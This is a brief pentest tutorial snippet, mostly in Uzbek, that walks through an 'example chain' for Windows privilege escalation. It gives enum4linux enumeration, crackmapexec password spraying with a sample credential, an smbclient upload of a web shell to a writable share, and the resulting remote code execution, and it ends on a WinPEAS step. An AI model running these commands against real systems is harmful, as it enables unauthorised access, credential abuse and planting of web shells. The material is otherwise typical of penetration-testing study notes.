**🔗 2️⃣ Windows privilege escalation zanjiri (Misol flow)**
🎯 Example Chain (real-case scenario):
enum4linux -a orqali foydalanuvchi va ochiq shares topasiz:

User found: backup_user
Share found: \\target\Public (read/write)
backup_user ni password spraying bilan sinaysiz:

crackmapexec smb <IP> -u backup_user -p 'Password1!'
Valid credentials:

[+] Login success with backup_user : Password1!
SMB orqali ochiq share’ga fayl upload:

smbclient //target/Public -U backup_user
put shell.aspx
Web shell orqali Low Privilege RCE olasiz.

WinPEAS orqali local enumeration




